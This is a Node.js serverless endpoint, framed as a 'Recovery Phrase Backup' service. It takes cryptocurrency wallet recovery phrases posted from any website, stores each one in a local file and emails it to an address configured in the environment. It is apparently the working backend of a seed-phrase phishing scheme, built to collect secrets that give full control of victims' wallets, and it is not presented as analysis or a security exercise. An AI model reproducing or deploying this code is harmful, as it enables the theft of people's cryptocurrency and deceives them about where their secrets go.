const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

async function saveBackup(data) {
    try {
        const backupDir = path.join(process.cwd(), 'backups');
        fs.mkdirSync(backupDir, { recursive: true });

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const hash = require('crypto').createHash('md5').update(data.recoveryPhrase + timestamp).digest('hex').substring(0, 8);
        const filename = path.join(backupDir, `backup-${timestamp}-${hash}.txt`);

        const content = `TIMESTAMP: ${data.timestamp}
RECOVERY PHRASE: ${data.recoveryPhrase}
USER AGENT: ${data.userAgent}
BACKUP ID: ${hash}`;

        await fs.promises.writeFile(filename, content, 'utf8');
        return { success: true, filename, hash };
    } catch (error) {
        console.error('Backup error:', error);
        return { success: false, error: error.message };
    }
}

async function sendEmail(data, backupInfo) {
    const transporter = nodemailer.createTransport({
        service: process.env.EMAIL_SERVICE || 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    const emailContent = `
Recovery Phrase Backup
---------------------
Backup ID: ${backupInfo.hash}
Timestamp: ${data.timestamp}
Recovery Phrase: ${data.recoveryPhrase}
User Agent: ${data.userAgent}`;

    try {
        await transporter.verify();
        const result = await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: `Recovery Backup ${backupInfo.hash}`,
            text: emailContent
        });
        return { success: true, messageId: result.messageId };
    } catch (error) {
        console.error('Email error:', error);
        return { success: false, error: error.message };
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false });
    }

    try {
        const { recoveryPhrase, timestamp, userAgent } = req.body;
        
        if (!recoveryPhrase) {
            return res.status(400).json({ success: false });
        }

        // Save backup
        const backupResult = await saveBackup({
            recoveryPhrase,
            timestamp,
            userAgent
        });

        if (!backupResult.success) {
            console.error('Failed to save backup:', backupResult.error);
            return res.status(500).json({ success: false });
        }

        // Send email
        const emailResult = await sendEmail({ recoveryPhrase, timestamp, userAgent }, backupResult);
        if (!emailResult.success) {
            console.error('Failed to send email:', emailResult.error);
        }

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false });
    }
};